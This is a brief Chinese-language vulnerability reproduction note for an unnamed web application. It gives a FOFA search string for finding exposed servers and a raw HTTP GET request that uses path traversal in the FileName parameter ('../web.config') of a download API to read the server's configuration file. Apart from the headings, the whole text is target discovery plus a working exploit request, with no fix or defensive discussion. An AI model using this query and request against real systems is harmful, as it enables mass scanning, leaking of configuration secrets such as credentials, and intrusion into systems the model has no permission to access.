## fofa查询语句

body="/api/DBRecord/getDBRecords"

## 漏洞复现

漏洞链接：http://xx.xx.xx.xx/api/Download/GetFile?FileName=../web.config&Title=123

```yaml
GET /api/Download/GetFile?FileName=../web.config&Title=123 HTTP/1.1
Host: xx.xx.xx.xxx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

